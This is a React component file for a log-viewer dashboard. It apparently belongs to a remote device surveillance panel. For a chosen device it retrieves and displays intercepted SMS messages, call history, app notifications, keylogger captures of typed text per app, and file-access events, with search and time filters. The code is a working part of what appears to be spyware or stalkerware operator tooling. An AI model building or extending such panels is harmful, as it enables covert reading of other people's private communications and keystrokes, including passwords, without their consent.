import React, { useState, useEffect } from 'react';
import {
  Box,
  Typography,
  Paper,
  Tab,
  Tabs,
  Table,
  TableBody,
  TableCell,
  TableContainer,
  TableHead,
  TableRow,
  FormControl,
  InputLabel,
  Select,
  MenuItem,
  Button,
  CircularProgress,
  Alert,
  TextField,
  Grid
} from '@mui/material';
import {
  FilterList as FilterIcon,
  Refresh as RefreshIcon
} from '@mui/icons-material';
import { 
  getSmsLogs,
  getCallLogs, 
  getNotificationLogs,
  getKeyLogs,
  getFileLogs
} from '../services/api';

const timeRanges = [
  { value: '1h', label: 'Last Hour' },
  { value: '6h', label: 'Last 6 Hours' },
  { value: '12h', label: 'Last 12 Hours' },
  { value: '24h', label: 'Last 24 Hours' },
  { value: '7d', label: 'Last 7 Days' },
  { value: '30d', label: 'Last 30 Days' },
  { value: 'all', label: 'All Time' },
];

function LogViewer({ devices, selectedDevice, onSelectDevice }) {
  const [selectedTab, setSelectedTab] = useState(0);
  const [selectedTimeRange, setSelectedTimeRange] = useState('24h');
  const [logs, setLogs] = useState([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(null);
  const [searchTerm, setSearchTerm] = useState('');

  useEffect(() => {
    if (selectedDevice) {
      fetchLogs();
    }
  }, [selectedDevice?.id, selectedTab, selectedTimeRange]);

  const fetchLogs = async () => {
    if (!selectedDevice) return;
    
    setLoading(true);
    setError(null);
    
    try {
      let data = [];
      switch (selectedTab) {
        case 0: // SMS
          data = await getSmsLogs(selectedDevice.id, selectedTimeRange);
          break;
        case 1: // Calls
          data = await getCallLogs(selectedDevice.id, selectedTimeRange);
          break;
        case 2: // Notifications
          data = await getNotificationLogs(selectedDevice.id, selectedTimeRange);
          break;
        case 3: // Keylog
          data = await getKeyLogs(selectedDevice.id, selectedTimeRange);
          break;
        case 4: // Files
          data = await getFileLogs(selectedDevice.id, selectedTimeRange);
          break;
        default:
          data = [];
      }
      setLogs(data || []);
    } catch (error) {
      console.error('Error fetching logs:', error);
      setError('Failed to fetch logs. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  const handleChangeTab = (event, newValue) => {
    setSelectedTab(newValue);
  };

  const getLogContent = () => {
    // If no device is selected, show device selection prompt
    if (!selectedDevice) {
      return (
        <Paper sx={{ p: 2, mt: 2 }}>
          <Typography align="center" color="text.secondary">
            Please select a device to view logs
          </Typography>
        </Paper>
      );
    }

    // If loading, show loading indicator
    if (loading) {
      return (
        <Box sx={{ display: 'flex', justifyContent: 'center', p: 4 }}>
          <CircularProgress />
        </Box>
      );
    }

    // If error, show error message
    if (error) {
      return (
        <Alert severity="error" sx={{ mt: 2, mb: 2 }}>
          {error}
        </Alert>
      );
    }

    // Filter logs based on search term
    const filteredLogs = logs.filter(log => {
      if (!searchTerm) return true;
      
      const searchLower = searchTerm.toLowerCase();
      
      // Different search logic for different log types
      switch (selectedTab) {
        case 0: // SMS
          return (
            (log.sender || '').toLowerCase().includes(searchLower) ||
            (log.recipient || '').toLowerCase().includes(searchLower) ||
            (log.message || '').toLowerCase().includes(searchLower)
          );
        case 1: // Calls
          return (
            (log.phone_number || '').toLowerCase().includes(searchLower) ||
            (log.call_type || '').toLowerCase().includes(searchLower) ||
            (log.contact_name || '').toLowerCase().includes(searchLower)
          );
        case 2: // Notifications
          return (
            (log.app_name || '').toLowerCase().includes(searchLower) ||
            (log.title || '').toLowerCase().includes(searchLower) ||
            (log.content || '').toLowerCase().includes(searchLower)
          );
        case 3: // Keylog
          return (
            (log.app_name || '').toLowerCase().includes(searchLower) ||
            (log.text || '').toLowerCase().includes(searchLower)
          );
        case 4: // Files
          return (
            (log.file_path || '').toLowerCase().includes(searchLower) ||
            (log.action || '').toLowerCase().includes(searchLower)
          );
        default:
          return true;
      }
    });

    // If no logs after filtering, show empty state
    if (filteredLogs.length === 0) {
      return (
        <Alert severity="info" sx={{ mt: 2 }}>
          No logs found for the selected criteria.
        </Alert>
      );
    }

    // Render different tables based on log type
    switch (selectedTab) {
      case 0: // SMS
        return renderSmsTable(filteredLogs);
      case 1: // Calls
        return renderCallsTable(filteredLogs);
      case 2: // Notifications
        return renderNotificationsTable(filteredLogs);
      case 3: // Keylog
        return renderKeylogTable(filteredLogs);
      case 4: // Files
        return renderFilesTable(filteredLogs);
      default:
        return null;
    }
  };

  const renderSmsTable = (data) => (
    <TableContainer component={Paper} sx={{ mt: 2 }}>
      <Table aria-label="SMS logs table">
        <TableHead>
          <TableRow>
            <TableCell>Timestamp</TableCell>
            <TableCell>Type</TableCell>
            <TableCell>Sender/Recipient</TableCell>
            <TableCell>Message</TableCell>
          </TableRow>
        </TableHead>
        <TableBody>
          {data.map((row, index) => (
            <TableRow key={row.id || index}>
              <TableCell>{new Date(row.timestamp).toLocaleString()}</TableCell>
              <TableCell>{row.type === 'sent' ? 'Sent' : 'Received'}</TableCell>
              <TableCell>{row.type === 'sent' ? row.recipient : row.sender}</TableCell>
              <TableCell>{row.message}</TableCell>
            </TableRow>
          ))}
        </TableBody>
      </Table>
    </TableContainer>
  );

  const renderCallsTable = (data) => (
    <TableContainer component={Paper} sx={{ mt: 2 }}>
      <Table aria-label="Call logs table">
        <TableHead>
          <TableRow>
            <TableCell>Timestamp</TableCell>
            <TableCell>Type</TableCell>
            <TableCell>Contact</TableCell>
            <TableCell>Duration</TableCell>
          </TableRow>
        </TableHead>
        <TableBody>
          {data.map((row, index) => (
            <TableRow key={row.id || index}>
              <TableCell>{new Date(row.timestamp).toLocaleString()}</TableCell>
              <TableCell>
                {row.call_type === 'incoming' 
                  ? 'Incoming' 
                  : row.call_type === 'outgoing' 
                    ? 'Outgoing' 
                    : 'Missed'}
              </TableCell>
              <TableCell>
                {row.contact_name || row.phone_number || 'Unknown'}
              </TableCell>
              <TableCell>
                {row.duration ? `${row.duration} seconds` : 'N/A'}
              </TableCell>
            </TableRow>
          ))}
        </TableBody>
      </Table>
    </TableContainer>
  );

  const renderNotificationsTable = (data) => (
    <TableContainer component={Paper} sx={{ mt: 2 }}>
      <Table aria-label="Notification logs table">
        <TableHead>
          <TableRow>
            <TableCell>Timestamp</TableCell>
            <TableCell>App</TableCell>
            <TableCell>Title</TableCell>
            <TableCell>Content</TableCell>
          </TableRow>
        </TableHead>
        <TableBody>
          {data.map((row, index) => (
            <TableRow key={row.id || index}>
              <TableCell>{new Date(row.timestamp).toLocaleString()}</TableCell>
              <TableCell>{row.app_name || 'Unknown'}</TableCell>
              <TableCell>{row.title || 'No Title'}</TableCell>
              <TableCell>{row.content || 'No Content'}</TableCell>
            </TableRow>
          ))}
        </TableBody>
      </Table>
    </TableContainer>
  );

  const renderKeylogTable = (data) => (
    <TableContainer component={Paper} sx={{ mt: 2 }}>
      <Table aria-label="Keylog table">
        <TableHead>
          <TableRow>
            <TableCell>Timestamp</TableCell>
            <TableCell>App</TableCell>
            <TableCell>Text</TableCell>
          </TableRow>
        </TableHead>
        <TableBody>
          {data.map((row, index) => (
            <TableRow key={row.id || index}>
              <TableCell>{new Date(row.timestamp).toLocaleString()}</TableCell>
              <TableCell>{row.app_name || 'Unknown'}</TableCell>
              <TableCell>{row.text || ''}</TableCell>
            </TableRow>
          ))}
        </TableBody>
      </Table>
    </TableContainer>
  );

  const renderFilesTable = (data) => (
    <TableContainer component={Paper} sx={{ mt: 2 }}>
      <Table aria-label="File access logs table">
        <TableHead>
          <TableRow>
            <TableCell>Timestamp</TableCell>
            <TableCell>Action</TableCell>
            <TableCell>File Path</TableCell>
            <TableCell>App</TableCell>
          </TableRow>
        </TableHead>
        <TableBody>
          {data.map((row, index) => (
            <TableRow key={row.id || index}>
              <TableCell>{new Date(row.timestamp).toLocaleString()}</TableCell>
              <TableCell>{row.action || 'Unknown'}</TableCell>
              <TableCell>{row.file_path || 'Unknown'}</TableCell>
              <TableCell>{row.app_name || 'Unknown'}</TableCell>
            </TableRow>
          ))}
        </TableBody>
      </Table>
    </TableContainer>
  );

  return (
    <Box sx={{ p: 2 }}>
      <Typography variant="h6" gutterBottom>
        Device Logs
      </Typography>
      
      <Paper>
        <Tabs 
          value={selectedTab} 
          onChange={handleChangeTab}
          variant="scrollable"
          scrollButtons="auto"
          aria-label="log types tabs"
        >
          <Tab label="SMS" />
          <Tab label="Calls" />
          <Tab label="Notifications" />
          <Tab label="Keylog" />
          <Tab label="Files" />
        </Tabs>
        
        <Box sx={{ p: 2 }}>
          <Grid container spacing={2} alignItems="center">
            <Grid item xs={12} sm={4} md={3}>
              <FormControl fullWidth size="small">
                <InputLabel id="time-range-label">Time Range</InputLabel>
                <Select
                  labelId="time-range-label"
                  value={selectedTimeRange}
                  onChange={(e) => setSelectedTimeRange(e.target.value)}
                  label="Time Range"
                >
                  {timeRanges.map((range) => (
                    <MenuItem key={range.value} value={range.value}>
                      {range.label}
                    </MenuItem>
                  ))}
                </Select>
              </FormControl>
            </Grid>
            
            <Grid item xs={12} sm={6} md={7}>
              <TextField
                fullWidth
                size="small"
                label="Search logs"
                variant="outlined"
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                InputProps={{
                  startAdornment: <FilterIcon fontSize="small" sx={{ mr: 1, color: 'action.active' }} />,
                }}
              />
            </Grid>
            
            <Grid item xs={12} sm={2} md={2}>
              <Button
                fullWidth
                variant="outlined"
                color="primary"
                startIcon={loading ? <CircularProgress size={20} /> : <RefreshIcon />}
                onClick={fetchLogs}
                disabled={loading || !selectedDevice}
              >
                Refresh
              </Button>
            </Grid>
          </Grid>
          
          {getLogContent()}
        </Box>
      </Paper>
    </Box>
  );
}

export default LogViewer;